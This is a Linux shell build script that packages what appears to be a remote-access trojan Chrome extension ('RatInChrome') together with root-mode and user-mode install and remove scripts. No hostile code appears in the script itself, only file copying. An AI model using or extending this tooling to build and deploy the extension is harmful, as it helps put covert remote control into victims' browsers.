
echo "Starting flush built directory..."
if [ -d built ]; then
	rm -rf built
fi
echo "Finished"

echo "Prepare directories..."
mkdir built
mkdir built/rootMode
mkdir built/userMode
mkdir built/rootMode/extension
mkdir built/userMode/extension
echo "Done"

echo "Starting build rootMode version for Linux..."
cp ../../RatInChromeInstaller/Linux/root/install.sh built/rootMode
cp ../../RatInChromeInstaller/Linux/root/remove.sh built/rootMode
cp ../../RatInChromeExtension/* built/rootMode/extension/
chmod +x built/rootMode/install.sh
chmod +x built/rootMode/remove.sh
echo "Extension rootVersion for Linux was built"

echo "Starting build userMode version for Linux..."
cp ../../RatInChromeInstaller/Linux/user/install.sh built/userMode
cp ../../RatInChromeInstaller/Linux/user/remove.sh built/userMode
cp ../../RatInChromeExtension/* built/userMode/extension/
chmod +x built/userMode/install.sh
chmod +x built/userMode/remove.sh
echo "Extension userVersion for Linux was built"

echo "DONE."